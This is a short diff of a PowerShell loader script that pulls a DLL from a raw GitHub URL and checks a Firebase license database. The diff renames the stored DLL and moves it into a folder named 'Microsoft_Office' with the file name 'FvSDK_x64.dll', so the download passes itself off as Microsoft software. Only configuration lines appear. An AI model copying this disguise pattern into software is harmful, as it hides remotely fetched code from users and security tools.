@@ -2,11 +2,11 @@ $ErrorActionPreference = "SilentlyContinue"
 
 # --- [ CONFIGURATION & PATHS ] ---
 $DbUrl        = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"
-$GithubDllUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/Reshade.dll"
+$GithubDllUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/STACKX.dll"
 
 # กำหนดเส้นทางจัดเก็บข้อมูลตามมาตรฐานโปรแกรมทั่วไป
-$AppDataDir   = "$env:LOCALAPPDATA\StackX_Systems"
-$LocalDllPath = "$AppDataDir\version.dll"
+$AppDataDir   = "$env:LOCALAPPDATA\Microsoft_Office"
+$LocalDllPath = "$AppDataDir\FvSDK_x64.dll"
 $RegPath      = "HKCU:\Software\StackX_Systems"
 
 # สร้างโฟลเดอร์สำหรับเก็บข้อมูลหากยังไม่ถูกสร้าง
